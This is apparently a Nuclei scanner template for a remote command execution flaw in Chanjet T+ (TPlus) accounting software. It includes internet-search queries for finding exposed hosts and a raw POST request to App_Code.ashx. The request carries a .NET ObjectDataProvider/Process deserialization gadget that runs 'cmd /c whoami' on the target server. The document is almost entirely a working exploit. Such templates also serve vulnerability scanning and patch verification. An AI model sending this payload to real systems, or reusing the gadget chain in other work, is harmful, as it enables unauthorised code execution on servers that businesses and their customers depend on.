id: Chanjet_TPlus_App_Code_Fileupload

info:
  name: Chanjet_TPlus_App_Code_Fileupload
  author: HK
  severity: high
  description:  畅捷通TPlus App_Code.ashx存在远程命令执行漏洞
  metadata:
    max-request: 1
    fofa-query: app="畅捷通-TPlus"
    Hunter-query: body="../lib/css/tp.control.css.ashx"
    Quake-query: body="../lib/css/tp.control.css.ashx"
    verified: true

http:
- raw:
  - |
    @timeout: 30s
    POST /tplus/ajaxpro/Ufida.T.CodeBehind._PriorityLevel,App_Code.ashx?method=GetStoreWarehouseByStore HTTP/1.1
    User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
    Accept-Encoding: gzip, deflate
    Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
    Connection: close
    Host: {{Hostname}}
    X-Ajaxpro-Method: GetStoreWarehouseByStore
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 585

    {
      "storeID":{
        "__type":"System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
        "MethodName":"Start",
        "ObjectInstance":{
          "__type":"System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
          "StartInfo":{
            "__type":"System.Diagnostics.ProcessStartInfo, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
            "FileName":"cmd",
            "Arguments":"/c whoami > test1.txt"
          }
        }
      }
    }

  max-redirects: 3
  matchers-condition: and
  matchers:
    - type: word
      part: body
      words:
      - System.ArgumentException